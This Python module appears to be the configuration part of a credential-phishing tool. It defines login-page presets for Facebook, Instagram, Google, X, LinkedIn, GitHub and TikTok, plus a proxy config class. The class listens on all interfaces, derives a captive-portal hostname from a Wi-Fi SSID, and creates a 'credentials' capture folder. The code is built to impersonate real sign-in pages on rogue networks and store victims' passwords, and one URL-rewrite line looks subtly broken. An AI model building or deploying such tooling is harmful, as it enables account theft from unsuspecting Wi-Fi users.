import os
import json


PRESETS = {
    "facebook": {
        "name": "Facebook",
        "url": "https://www.facebook.com",
        "extra": ["static.xx.fbcdn.net", "scontent.xx.fbcdn.net", "es-la.facebook.com"],
    },
    "instagram": {
        "name": "Instagram",
        "url": "https://www.instagram.com",
        "extra": ["static.cdninstagram.com", "scontent.cdninstagram.net"],
    },
    "google": {
        "name": "Google / Gmail",
        "url": "https://accounts.google.com",
        "extra": ["ssl.gstatic.com", "www.gstatic.com", "apis.google.com"],
    },
    "x": {
        "name": "X (Twitter)",
        "url": "https://x.com",
        "extra": ["abs.twimg.com", "abs-0.twimg.com", "video.twimg.com", "t.co", "api.x.com", "pbs.twimg.com"],
    },
    "linkedin": {
        "name": "LinkedIn",
        "url": "https://www.linkedin.com",
        "extra": ["static.licdn.com", "media.licdn.com"],
    },
    "github": {
        "name": "GitHub",
        "url": "https://github.com",
        "extra": ["github.githubassets.com", "avatars.githubusercontent.com"],
    },
    "tiktok": {
        "name": "TikTok",
        "url": "https://www.tiktok.com",
        "extra": ["sf16-website-login.neutral.ttwstatic.com"],
    },
}


class ProxyConfig:
    def __init__(self, target_domain, listen_host="0.0.0.0", listen_port=8080,
                 use_https=False, capture_path="./captures", extra_domains=None,
                 ssid=None):
        self.target_domain = target_domain.rstrip("/")
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.use_https = use_https
        self.capture_path = capture_path
        self.extra_domains = extra_domains or []
        self.ssid = ssid or "wifi"

        self._normalize_target()

        proxy_scheme = "https" if self.use_https else "http"
        self.proxy_origin = f"{proxy_scheme}://{self.listen_host}:{self.listen_port}"

    def portal_host(self):
        s = self.ssid.strip().replace(" ", "").replace("_", "")[:20]
        if not s:
            s = "wifi"
        return s

    def _normalize_target(self):
        domain = self.target_domain
        if domain.startswith("http://"):
            domain = domain[7:]
        elif domain.startswith("https://"):
            domain = domain[8:]

        if "/" in domain:
            parts = domain.split("/", 1)
            self.target_host = parts[0]
            self.target_path_prefix = "/" + parts[1]
        else:
            self.target_host = domain
            self.target_path_prefix = ""

        if not self.target_domain.startswith("http"):
            self.target_scheme = "https"
            self.target_domain = "https://" + self.target_domain
        else:
            self.target_scheme = self.target_domain.split("://")[0]

        self.target_base_for_rewrites = self.target_domain + "//" + self.target_host

    def ensure_capture_dir(self):
        os.makedirs(self.capture_path, exist_ok=True)
        os.makedirs(os.path.join(self.capture_path, "credentials"), exist_ok=True)

    def get_target_url(self, path):
        clean_path = path.lstrip("/")
        if self.target_path_prefix:
            full_path = self.target_path_prefix.rstrip("/") + "/" + clean_path
        else:
            full_path = "/" + clean_path
        return self.target_domain + full_path
